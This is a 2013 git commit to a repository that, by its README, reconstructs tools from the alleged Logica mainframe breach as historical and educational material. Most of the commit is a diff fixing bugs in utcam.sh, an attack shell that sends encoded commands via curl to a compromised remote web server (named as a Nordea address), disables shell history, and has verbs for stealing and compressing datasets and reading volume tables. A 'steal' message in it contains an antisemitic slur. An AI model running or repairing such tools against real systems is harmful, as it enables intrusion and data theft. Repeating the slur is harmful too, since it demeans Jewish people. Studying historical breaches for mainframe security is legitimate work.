700aa05011b964ae0b0f3581ac5356a7abfa8b64
mainframed <mainframed767@gmail.com>
2013-05-05 17:19:13 -0700

    fixing typos, adding readme

---
+++ README.md
@@ -0,0 +1,31 @@
+## Logica Investigation
+
+**Description**: In this repository is a collection of files outlined/documented in the various files included within the alleged Logica breach. Most of the files are complete (typos notwithstanding) and incomplete files contain whatever was documented in the investigation paperwork.
+
+##WHY?
+
+I decided to document these files here due to the historical nature of the breach. It is the first publicly documented IBM z/OS breach in which the some of the code is actually available. It also serves as educational resources to those wanting to get interested in testing/auditing mainframes and mainframe security. 
+
+##The Files
+
+**aptitup.jcl**: A JES job (JCL) file which executes a file in the OMVS (aka UNIX) environment using BPXBATCH. 
+
+**Enum.c**: An OMVS program to enumerate users and execute a shell. 
+
+**go.rx**: A REXX script used to escalate privileges to the UID/GID supplied to the script. It is assumed this program is running with an appropriate setuid.
+
+**Ha.C**: A C program used to escalate privileges to the UID/GID supplied in the script. It is assumed this program would be run with an appropriate setuid. 
+
+**kuku.rx**: A REXX script which exploits a previously unknown vulnerability in CNMEUNIX (a program in OMVS with setuid). **this code is only a snippet as that is all that is available**.
+
+**nop.jcl**: A JCL file which "does nothing" ;)
+
+**Tfy.source.backdoor**: A ASM program which changes ACEE settings. 
+
+**tsocmd.rx**: A REXX script which executes TSO commands. This is different from the /bin/tso command as it can execute (i.e. authorized programs). This script is freely available from IBM but was found during the investigation. 
+
+**utcam.sh**: BASH script which when run send commands to a remote listening web server. 
+
+**vc242**: I have no idea. 
+
+
--- utcam.sh
+++ utcam.sh
@@ -5,23 +5,25 @@
 
 
 
-h="IP-adress annan stordator"
+#h="IP-adress annan stordator"
+h="IP-address Nordea"
+
 
 ua="Mozilla/5.0 (Windows NT 5.1; x86) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.168 Safari/535.19"
 dh="UT"
 
 while :; do
 
-echo -n " $dh Dillz>  "
+echo -n " $dh 8===D  "
 read cmdline
 echo " << $cmdline"
-if [ -z "$cmdline" ];
+if [ -z "$cmdline" ]; then
 	echo "... FIN"
 	exit 0
 fi
 
 verb=`echo "$cmdline"|cut -d' ' -f1`
-arg=`echo "$cmdline|cut -d' ' -f2-`
+arg=`echo "$cmdline"|cut -d' ' -f2-`
 cmd=""
 pro=""
 post=""
@@ -29,20 +31,20 @@ tgt=""
 
 if [ "$verb" = "rx" ]; then
 	echo ":pPPpP REXX ROXX" >&2
-	pro=" echo '/* REXX */ > /tmp/rx; echo '' >> /tmp/rx;chmod 755 /tmp/rx;";
+	pro=" echo '/* REXX */' > /tmp/rx; echo '' >> /tmp/rx;chmod 755 /tmp/rx;";
 	post=" rm -f /tmp/rx ";
 	tgt=""
 	cmd="$arg"
 fi
 
 if [ "$verb" = "rxout" ]; then
-	echo :pPPpP REXX REXX OUT" >&
+	echo ":pPPpP REXX REXX OUT" >&2
 fi
 
 if [ "$verb" = "rxin" ]; then
 	echo ":pPPP REXXOPHiLE" >&2
 	echo " [ $arg ] "
-	inputile='echo "$arg"|cut -d' ' -f1`
+	inputile=`echo "$arg"|cut -d' ' -f1`
 	rest=`echo "$arg"|cut -d' ' -f2-`
 	cmd=`(echo -n "PARMS='${rest}';"; cat $inputfile)`
 	pro="echo '/* REXX */' > /tmp/rx; echo 'l=\"\"; say \"ok\";exit 0; ' >> /tmp/rx; chmod 755 /tmp/rx; cat /tmp/rx;";
@@ -65,30 +67,29 @@ if [ "$verb" = "sh" ]; then
 	cmd="$arg"
 fi
 
-if [ "$verb" = "shin"]; then
+if [ "$verb" = "shin" ]; then
 	echo ":PppPPP PHILE SHOCK" >&2
 	echo " [ $arg ] "
-	inputfile=`echo "$arg"|cut -d' ' -f1
+	inputfile=`echo "$arg"|cut -d' ' -f1`
 	cmd=$(cat $inputfile|sed 's/\x0d//g')
 fi
 
-if [ "$verb = "steal" ]; then
+if [ "$verb" = "steal" ]; then
 	echo ":PpppPP SHYLOCK THE JEWISH THIEF STEALiNG TO g1" >&2
 	cmd="rm -fr /tmp/sl/$arg/; cat \"//'$arg'\" | compress -c > /tmp/sl/$arg.raw.z;"
 	#[SoF] I think the above line had a bug I added the double quotes at the end of the line
 	tgt=""
-	echo " [$cmd ] "
+	echo " [ $cmd ] "
 fi
 
 if [ "$verb" = "vol" ]; then
 	echo ":PppPPp VOLUMNE GOES TO 11" >&2
-	pro="echo '/*REXX */' > /tmp/rx; echo 'address syscall \" read 0 s 4096\";
+	pro="echo '/*REXX */' > /tmp/rx; echo 'address syscall \" read 0 s 4096\"';"
 	tgt=" "
-	cmd="${cmd}address tso \"allocate ddname(sysprint) sysout\"; 
-	  address tso \"allocate ddname(sysin) dummy\"; "
+	cmd="${cmd}address tso \"allocate ddname(sysprint) sysout\"; address tso \"allocate ddname(sysin) dummy\"; "
 	for vol in $arg ; do
-		cmd="${cmd}address tso \"allocate dsname('FORMAT4.DSCB') DDNAME(SYSLIB) SHR UNIT(3390) VOLUMNE(${vol}) KEYLEN(44) DSORG(DA) EROPT(ACC)\";"
-		cmd="${$cmd}address tso \"TSOEXEC CALL *(AMASPZAP)\"; address tso \"REPRO INFILE(SYSLIB) OUTFILE(outdd)\";"
+		cmd="${cmd}address tso \"allocate dsname('FORMAT4.DSCB') DDNAME(SYSLIB) SHR UNIT(3390) VOLUMNE(${vol}) KEYLEN\(44) DSORG(DA) EROPT(ACC)\";"
+		cmd="${cmd}address tso \"TSOEXEC CALL *(AMASPZAP)\"; address tso \"REPRO INFILE(SYSLIB) OUTFILE(outdd)\";"
 	done
 	echo "[ $cmd ]"
 fi
@@ -99,15 +100,16 @@ if [ "$verb" = "tso" ]; then
 fi
 
 echo '>> go go go '
-enccmd=`echo -n "$cmd"|inconv -c -f us-ascii -t ibm-1047|xxd -ps|while read l; do echo -n "$l"; done
 
-body="l=$( echo -n \"$endcmd}\"|sed 's/\([0-9a-f\)/\\\\x\1/g'|sed 's/\\\\x25/\\\\x15/g' ); printf \$l|home/tmp exec $tgt"
+enccmd=`echo -n "$cmd"|iconv -c -f us-ascii -t ibm-1047|xxd -ps|while read l; do echo -n "$l"; done `
+
+body="l=$( echo -n \"{$enccmd}\"|sed 's/\([0-9a-f][0-9a-f]\)/\\\\x\1/g'|sed 's/\\\\x25/\\\\x15/g' ); printf \$l|HOME=/tmp exec $tgt"
 
 pro="exec 2>&1; unset HISTORY; unset HISTFILE; echo 'status: 404 multifail'; echo 'content-type: text/plain'; echo'';${pro}"
 
 post="; ${post}; exit 1;"
 
-curl --data "$pro $body $post" -v -k -A "$ua" --url https://${h}/
+curl --data "$pro $body $post" -v -A "$ua" --url http://${h}/
 
 done
 
